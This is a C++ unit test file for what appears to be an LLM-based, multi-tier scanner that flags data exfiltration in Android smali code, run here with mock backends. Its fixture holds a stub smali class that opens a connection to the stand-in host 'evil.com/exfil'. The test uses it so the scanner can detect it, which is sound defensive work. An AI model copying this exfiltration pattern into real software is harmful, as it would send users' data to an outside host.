#include <gtest/gtest.h>
#include <fstream>

#include "graph/engine/graph_runner.h"
#include "graph/graphs/scan_task_graph.h"
#include "LLMBackend.h"

using namespace area::graph;

static const char* TEST_SMALI = R"(.class public Lcom/test/Sample;
.super Ljava/lang/Object;
.source "Sample.java"

.field private key:[B

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public sendData(Ljava/lang/String;)V
    .registers 3
    new-instance v0, Ljava/net/URL;
    const-string v1, "http://evil.com/exfil"
    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    return-void
.end method

.method private encrypt([B)[B
    .registers 3
    const-string v0, "AES"
    invoke-static {v0}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
    move-result-object v0
    return-object v0
.end method
)";

class ScanGraphTest : public ::testing::Test {
protected:
    std::string smaliPath = "/tmp/area_test_sample.smali";

    // Three mock backends for three tiers
    area::AiEndpoint ep0{"tier0", "mock", "", "auto"};
    area::AiEndpoint ep1{"tier1", "mock", "", "auto"};
    area::AiEndpoint ep2{"tier2", "mock", "", "auto"};
    area::MockBackend tier0{ep0};
    area::MockBackend tier1{ep1};
    area::MockBackend tier2{ep2};

    void SetUp() override {
        std::ofstream f(smaliPath);
        f << TEST_SMALI;
    }

    void TearDown() override {
        std::remove(smaliPath.c_str());
    }
};

TEST_F(ScanGraphTest, FullScanWithMocks) {
    // Tier 1 (worker for triage): returns analysis JSON
    tier1.setResponse(R"({
        "relevant": true,
        "confidence": 0.8,
        "api_calls": ["URL.openConnection"],
        "findings": ["Method connects to external URL"],
        "reasoning": "Method connects to external URL for potential data exfiltration"
    })");

    // Tier 0 (supervisor for triage + synthesis supervisor): PASS
    tier0.setResponse("PASS - output looks correct");

    // Tier 2 (worker for deep analysis + synthesis worker): returns analysis
    // tier2 handles deep analysis (3 methods) + synthesis (1 call) = 4 responses
    tier2.setResponses({
        R"json({"detailed_findings":["constructor - no relevant behavior"],"evidence":[],"data_flows":["init"],"relevance_score":5,"reasoning":"constructor"})json",
        R"json({"detailed_findings":["URL connection to http://evil.com/exfil"],"evidence":["URL.openConnection","http://evil.com/exfil"],"data_flows":["URL connection to http://evil.com/exfil"],"relevance_score":90,"reasoning":"exfiltration via HTTP"})json",
        R"json({"detailed_findings":["AES cipher usage"],"evidence":["Cipher.getInstance(AES)"],"data_flows":["AES cipher"],"relevance_score":70,"reasoning":"crypto operation"})json",
        R"json({"answer":"This class sends data to http://evil.com/exfil using URL connections and encrypts data with AES.","relevant_methods":[{"method":"sendData","finding":"HTTP connection to evil.com"},{"method":"encrypt","finding":"AES encryption"}],"evidence_summary":"Encrypts and exfiltrates data.","overall_relevance":"relevant","relevance_score":90,"recommendation":"block"})json"
    });

    TierBackends backends;
    backends.backends[0] = &tier0;
    backends.backends[1] = &tier1;
    backends.backends[2] = &tier2;

    auto graph = buildScanTaskGraph(backends, PROMPTS_DIR);

    TaskContext initial;
    initial.set("file_path", smaliPath);
    initial.set("scan_goal", "Does this code exfiltrate data or connect to external servers?");

    GraphRunner runner;

    std::vector<std::string> nodeTrace;
    runner.onNodeStart([&](const std::string& name, const TaskContext&) {
        nodeTrace.push_back(name);
    });

    auto result = runner.run(graph, std::move(initial));

    // Should have a risk profile
    ASSERT_TRUE(result.has("risk_profile"));
    auto profile = result.get("risk_profile");
    EXPECT_EQ(profile["overall_relevance"], "relevant");
    EXPECT_EQ(profile["recommendation"], "block");
    EXPECT_EQ(profile["relevance_score"], 90);

    // Verify the graph executed the expected nodes
    EXPECT_EQ(nodeTrace[0], "read_file");
    EXPECT_EQ(nodeTrace[1], "detect_format");
    EXPECT_EQ(nodeTrace[2], "split_methods");

    // rag_enrich should appear in the trace (between filter and deep_analysis)
    bool hasRagEnrich = false;
    for (auto& n : nodeTrace) {
        if (n == "rag_enrich") { hasRagEnrich = true; break; }
    }
    EXPECT_TRUE(hasRagEnrich);

    // All three tiers should have been called
    EXPECT_GT(tier0.callCount(), 0);
    EXPECT_GT(tier1.callCount(), 0);
    EXPECT_GT(tier2.callCount(), 0);
}

TEST_F(ScanGraphTest, MethodCallsExtracted) {
    // Verify that split_methods extracts call graph edges into TaskContext
    tier1.setResponse(R"({"relevant": true, "confidence": 0.95, "api_calls": [], "findings": [], "reasoning": "test"})");
    tier0.setResponse("PASS");
    tier2.setResponses({
        R"json({"detailed_findings":["test"],"evidence":[],"data_flows":[],"relevance_score":50,"reasoning":"test"})json",
        R"json({"detailed_findings":["test"],"evidence":[],"data_flows":[],"relevance_score":50,"reasoning":"test"})json",
        R"json({"detailed_findings":["test"],"evidence":[],"data_flows":[],"relevance_score":50,"reasoning":"test"})json",
        R"json({"answer":"test","relevant_methods":[],"evidence_summary":"test","overall_relevance":"relevant","relevance_score":50,"recommendation":"review"})json"
    });

    TierBackends backends;
    backends.backends[0] = &tier0;
    backends.backends[1] = &tier1;
    backends.backends[2] = &tier2;

    auto graph = buildScanTaskGraph(backends, PROMPTS_DIR);

    TaskContext initial;
    initial.set("file_path", smaliPath);
    initial.set("scan_goal", "test");

    GraphRunner runner;

    // Collect method_calls from node contexts
    bool foundMethodCalls = false;
    runner.onNodeEnd([&](const std::string& nodeName, const TaskContext& ctx) {
        if (ctx.has("method_calls")) {
            auto calls = ctx.get("method_calls");
            if (calls.is_array() && !calls.empty()) {
                foundMethodCalls = true;
            }
        }
    });

    runner.run(graph, std::move(initial));

    // The test smali has invoke-direct and invoke-virtual calls
    EXPECT_TRUE(foundMethodCalls);
}

TEST_F(ScanGraphTest, UnsupportedFormat) {
    // Write a non-smali file
    std::string txtPath = "/tmp/area_test_sample.txt";
    {
        std::ofstream f(txtPath);
        f << "not smali";
    }

    area::MockBackend dummy(ep0);
    TierBackends backends;
    backends.backends[0] = &dummy;
    backends.backends[1] = &dummy;
    backends.backends[2] = &dummy;

    auto graph = buildScanTaskGraph(backends, PROMPTS_DIR);

    TaskContext initial;
    initial.set("file_path", txtPath);

    GraphRunner runner;
    auto result = runner.run(graph, std::move(initial));

    EXPECT_TRUE(result.discarded);
    EXPECT_EQ(dummy.callCount(), 0); // no LLM calls for unsupported format

    std::remove(txtPath.c_str());
}
